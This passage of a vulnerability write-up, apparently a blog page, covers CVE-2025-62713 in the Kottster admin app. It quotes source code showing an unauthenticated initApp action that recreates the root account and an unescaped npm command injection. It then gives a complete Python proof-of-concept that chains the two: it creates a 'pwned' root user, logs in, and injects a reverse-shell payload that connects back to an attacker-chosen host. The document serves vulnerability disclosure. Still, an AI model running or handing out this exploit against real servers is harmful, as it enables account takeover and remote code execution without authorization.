</code></pre></div></div><p>The installPackagesForDataSource action takes the provided command arguments and sets them as arguments to an npm command. However, because these arguments are not shell-escaped, a command injection vulnerability can occur.</p><p>That said, the installPackagesForDataSource action can only be invoked by an authenticated user account, and user accounts can only be created by administrators — which limits an attacker’s ability to exploit this issue unless they first obtain valid credentials.</p><h1 id="how-to-chain-to-pre-auth"> <a href="#how-to-chain-to-pre-auth" class="anchor-heading" aria-labelledby="how-to-chain-to-pre-auth"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> How to chain to Pre-Auth</h1><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">isTokenValid</span> <span class="o">&amp;&amp;</span> <span class="nx">action</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">([</span><span class="dl">'</span><span class="s1">getApp</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">initApp</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">login</span><span class="dl">'</span><span class="p">]</span> <span class="nf">as </span><span class="p">(</span><span class="nx">keyof</span> <span class="nx">InternalApiSchema</span><span class="p">)[]).</span><span class="nf">includes</span><span class="p">(</span><span class="nx">action</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">UnauthorizedException</span><span class="p">(</span><span class="s2">`Invalid JWT token: </span><span class="p">${</span><span class="nx">invalidTokenErrorMessage</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
      <span class="p">}</span>
</code></pre></div></div><p>An interesting observation: as noted earlier, unauthenticated users are permitted to invoke the getApp, initApp, and login actions.</p><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">class</span> <span class="nc">InitApp</span> <span class="kd">extends</span> <span class="nc">DevAction</span> <span class="p">{</span>
  <span class="kr">public</span> <span class="k">async</span> <span class="nf">execute</span><span class="p">({</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">rootUsername</span><span class="p">,</span> <span class="nx">rootPassword</span> <span class="p">}:</span> <span class="nx">InternalApiBody</span><span class="o">&lt;</span><span class="dl">'</span><span class="s1">initApp</span><span class="dl">'</span><span class="o">&gt;</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">InternalApiResult</span><span class="o">&lt;</span><span class="dl">'</span><span class="s1">initApp</span><span class="dl">'</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">fileWrtier</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileWriter</span><span class="p">({</span> <span class="na">usingTsc</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">app</span><span class="p">.</span><span class="nx">usingTsc</span> <span class="p">});</span>
    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nf">randomUUID</span><span class="p">();</span>

    <span class="c1">// Get API token from Kottster API</span>
    <span class="kd">let</span> <span class="na">apiToken</span><span class="p">:</span> <span class="nx">string</span> <span class="o">|</span> <span class="kc">undefined</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">kottsterApi</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">KottsterApi</span><span class="p">();</span>
      <span class="kd">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">kottsterApi</span><span class="p">.</span><span class="nf">createApp</span><span class="p">();</span>
      <span class="nx">apiToken</span> <span class="o">=</span> <span class="nx">res</span><span class="p">?.</span><span class="nx">apiToken</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Failed to obtain API token from Kottster API. Some features that require Kottster API access will not work.</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">const</span> <span class="nx">secretKey</span> <span class="o">=</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">jwtSecretSalt</span> <span class="o">=</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
    <span class="nx">fileWrtier</span><span class="p">.</span><span class="nf">writeAppServerFile</span><span class="p">(</span>
      <span class="nx">secretKey</span><span class="p">,</span> 
      <span class="nx">jwtSecretSalt</span><span class="p">,</span>
      <span class="nx">apiToken</span><span class="p">,</span>
      <span class="nx">rootUsername</span><span class="p">,</span> 
      <span class="nx">rootPassword</span>
    <span class="p">);</span>
    <span class="nx">fileWrtier</span><span class="p">.</span><span class="nf">writeSchemaJsonFile</span><span class="p">({</span>
      <span class="nx">id</span><span class="p">,</span>
      <span class="na">meta</span><span class="p">:</span> <span class="p">{</span>
        <span class="nx">name</span><span class="p">,</span>
        <span class="na">icon</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://web.kottster.app/icon.png</span><span class="dl">'</span><span class="p">,</span>
      <span class="p">},</span>
    <span class="p">});</span>

    <span class="c1">// We have to build a jwt secret here because identity provider is not yet initialized when this action runs</span>
    <span class="kd">const</span> <span class="nx">jwtSecret</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">id</span><span class="p">}${</span><span class="nx">secretKey</span><span class="p">}${</span><span class="nx">jwtSecretSalt</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">rootUserJwtToken</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">app</span><span class="p">.</span><span class="nx">identityProvider</span><span class="p">.</span><span class="nf">generateTokenForRootUser</span><span class="p">(</span><span class="mi">86400</span><span class="p">,</span> <span class="nx">jwtSecret</span><span class="p">);</span>

    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">rootUserJwtToken</span><span class="p">,</span>
    <span class="p">};</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>The initApp action performs initial setup and therefore should be removed or disabled at the application level after the first-time configuration. However, the code contains no check to determine whether the application has already been configured. This implies that anyone can re-run the initialization process, which allows recreation of an administrator account and potential takeover of the application. Such an account takeover can be chained to the Pre-Auth RCE to achieve remote code execution without prior authentication.</p><h1 id="poc-code"> <a href="#poc-code" class="anchor-heading" aria-labelledby="poc-code"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PoC Code</h1><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">action</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">initApp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">installPackagesForDataSource</span><span class="sh">"</span><span class="p">]</span>
<span class="n">api_endpoint</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/internal-api?action={}</span><span class="sh">"</span>
<span class="n">attacker</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">gen_payload</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="k">return</span> <span class="sh">"""</span><span class="s">asdf;python -c </span><span class="sh">'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">,{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="s">]);</span><span class="sh">'"""</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">intro</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"""</span><span class="s"> _   __      _   _       _                                        
| | / /     | | | |     | |                                       
| |/ /  ___ | |_| |_ ___| |_ ___ _ __                             
|    \ / _ \| __| __/ __| __/ _ \ </span><span class="sh">'</span><span class="s">__|                            
| |\  \ (_) | |_| |_\__ \ ||  __/ |_                              
\_| \_/\___/ \__|\__|___/\__\___|_( )                             
                                  |/                              
                                                                  
______                 ___        _   _      ______  _____  _____ 
| ___ \               / _ \      | | | |     | ___ \/  __ \|  ___|
| |_/ / __ ___ ______/ /_\ \_   _| |_| |__   | |_/ /| /  \/| |__  
|  __/ </span><span class="sh">'</span><span class="s">__/ _ \______|  _  | | | | __| </span><span class="sh">'</span><span class="s">_ \  |    / | |    |  __| 
| |  | | |  __/      | | | | |_| | |_| | | | | |\ \ | \__/\| |___ 
\_|  |_|  \___|      \_| |_/\__,_|\__|_| |_| \_| \_| \____/\____/ 
                                                                  
                                                                   </span><span class="sh">"""</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="nf">intro</span><span class="p">()</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">api_endpoint</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">action</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">asdfasdf</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rootUsername</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rootPassword</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">}),</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">}).</span><span class="nf">json</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">rootJwtToken</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="sh">'</span><span class="s">result</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">rootUserJwtToken</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">rootJwtToken</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] The account </span><span class="sh">'</span><span class="s">pwned/pwned</span><span class="sh">'</span><span class="s"> has been successfully created</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">userJwtToken</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">api_endpoint</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">action</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">usernameOrEmail</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">}),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">).</span><span class="nf">json</span><span class="p">()</span>
        <span class="n">userJwtToken</span> <span class="o">=</span> <span class="n">userJwtToken</span><span class="p">[</span><span class="sh">"</span><span class="s">result</span><span class="sh">"</span><span class="p">][</span><span class="sh">"</span><span class="s">userJwtToken</span><span class="sh">"</span><span class="p">]</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">userJwtToken</span><span class="p">)</span>
        <span class="n">headers</span><span class="p">[</span><span class="sh">"</span><span class="s">Authorization</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">userJwtToken</span>

        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Reverse shell connection established</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">api_endpoint</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">action</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="nf">gen_payload</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="n">port</span><span class="p">)}),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">).</span><span class="n">text</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">exploit</span><span class="p">()</span>
</code></pre></div></div><p><img src="/assets/images/contents/CVE-2025-62713/poc.png" alt="image.png" /></p></main><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-100 mb-0"></p><div class="d-flex mt-2"></div></footer></div></div><div class="search-overlay"></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.6/dist/mermaid.min.js"></script> <script> var config = {} ; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
